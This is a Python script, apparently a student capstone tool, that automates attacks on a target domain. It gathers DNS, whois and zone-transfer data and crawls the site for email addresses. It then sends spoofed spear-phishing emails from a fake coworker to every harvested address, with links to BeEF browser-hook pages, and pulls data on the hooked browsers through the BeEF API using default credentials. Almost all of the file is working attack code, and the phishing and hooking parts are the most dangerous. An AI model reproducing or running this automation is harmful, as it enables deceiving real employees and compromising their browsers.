#!/usr/bin/python

# autocapstone v0.1 - Austin Jackson
# Given a url, attempts to automate the five-phase offensive methodology process.

import json
import os
import sys
import time

def write_cmd(cmd, file_name):
    with open(file_name+'.txt', 'w') as f:
        f.write(os.popen(cmd).read())

def prompt_stop():
    prompt = raw_input('Continue (y/n)? ')
    if prompt[0].lower() == 'n':
        sys.exit(1)

# start
print '----------------------------------'
print 'Autocapstone v0.2 - Austin Jackson'
print '----------------------------------'
url = raw_input('Url? ')

##### PHASE 1
print '\n------INFORMATION-GATHERING-------'
print 'Performing nslookup...'
write_cmd('nslookup {0}'.format(url), 'nslookup')
print 'Performing whois...'
write_cmd('whois {0}'.format(url), 'whois')
print 'Finding nameservers...'
write_cmd('dig {0} NS'.format(url), 'nameservers')

# get web server ip
with open('nslookup.txt', 'r') as f:
    web_ip = f.read().split()[-1]
    if len(web_ip.split('.')) != 4:
        print 'nslookup failed, url not up?'
        sys.exit(1)
print 'IP of web server found.'

# get name server ip
with open('nameservers.txt', 'r') as f:
    for line in f.readlines():
        if line[0] != ';':
            try:
                ip = line.split()[-1]
                if ip.split('.')[0] == web_ip.split('.')[0]:
                    ns_ip = ip
            except:
                continue

# zone transfer
try:
    ns_ip
    print 'IP of name server found.'
except:
    print 'No name server found.'
    prompt_stop()
try:
    write_cmd('dig @{0} {1} AXFR'.format(ns_ip, url), 'zonetransfer')
    print 'Zone Transfer was successful.'
except:
    print 'Zone Transfer failed.'
    prompt_stop()

# spider website for emails
print 'Crawling the website for emails!'
os.system('python email_crawl.py '+url)

# get mail server IP
with open('zonetransfer.txt') as f:
    for line in f.readlines():
        try:
            ip = line.split()[-1]
            if ('mail' in line) and (ip.split('.')[0] == web_ip.split('.')[0]):
                mail_ip = ip
                break
        except:
            continue

##### PHASE 2
print '\n------SCANNING-&-ENUMERATION------'

# Gather IPs
#hosts = []
#subnet = '.'.join(web_ip.split('.')[0:3]) + '.0/24'
#print 'Performing probe scan...'
#write_cmd('nmap -sP '+subnet, 'nmap_probe')
#with open('nmap_probe.txt') as f:
#    for line in f.readlines():
#        if 'Nmap scan report' in line:
#            hosts.append(line.split()[-1])

# host scanning
#print 'Agressively scanning hosts...'
#for host in hosts:
#    print 'Scanning', host
#    write_cmd('nmap -A '+host, 'nmap_'+host)

# Get mail server IP
with open('zonetransfer.txt') as f:
    for line in f.readlines():
        try:
            ip = line.split()[-1]
            if ('mail' in line) and (ip.split('.')[0] == web_ip.split('.')[0]):
                mail_ip = ip
                break
        except:
            continue

# email_template
email_text = '''Hey there!<br/ >

I'm new in the office and ran into this webpage, what is this?<br/ >

<a href="http://192.168.169.140:3000/demos/{0}.html">link</a><br/ >

Thanks so much,<br/ >
Mike Robinson'''

# auto spear phish
try:
    mail_ip
    print "IP of mail server found."

    email_count = 0
    with open("emails.txt") as f:
        for email in f.readlines():
            email_count += 1
            victim = email.rstrip('\n')
            fname = victim.split('@')[0]

            # create custom redirects
            os.system('cp /usr/share/beef-xss/extensions/demos/html/redirect.html \
/usr/share/beef-xss/extensions/demos/html/{0}.html'.format(fname))
            tmp_email = open('/root/scripts/fake_email.html', 'w')
            tmp_email.write(email_text.format(fname))
            tmp_email.close()

            email_cmd = 'sendemail -f mrobinson@{0} -t {1} -u \"Hello!\" -s {2}:25 -o \
message-content-type=html -o message-file=/root/scripts/fake_email.html'.format(url, victim, mail_ip)
            os.system(email_cmd)
            print 'Spear phishing email has been sent to', victim
    raw_input("Press ENTER when beef is gucci!")
    # wait until check in
except:
    print "Mail server IP was not found, not attempting spear phishing."

# beefness
token = os.popen('curl -H "Content-Type: application/json" -X POST -d \'{"username":"beef", \
"password":"beef"}\' http://127.0.0.1:3000/api/admin/login').read().split('"')[-2]
write_cmd('curl http://127.0.0.1:3000/api/hooks?token='+token, 'hooks')

with open('hooks.txt', 'r') as f:
    hook_data = json.load(f)

# get sessions for browsers, should just do all!
beef_data = []
for n in range(email_count):
    try:
        session = hook_data['hooked-browsers']['offline'][str(n)]['session']
        name    = hook_data['hooked-browsers']['offline'][str(n)]['page_uri'][34:-5]
        beef_data.append([session, name])
    except:
        continue

# browser data is fked up here (not a json object)
for x in beef_data:
    write_cmd('curl http://127.0.0.1:3000/api/hooks/{0}?token={1}'.format(x[1],token), '{0}_browser'.format(x[1]))
    with open('{0}_browser.txt'.format(x[1]), 'r') as f:
        browser_data = json.load(f)
    print x[1], 'using', browser_data['BrowserName'], browser_data['BrowserVersion']


#print '\n----------GAINING-ACCESS----------'
#print '\n---------EXPANDING-ACCESS---------'
#print '\n--------SUSTAINING-ACCESS---------'


print '----------------------------------'
print 'Done, double check files please!!!'
print '----------------------------------'
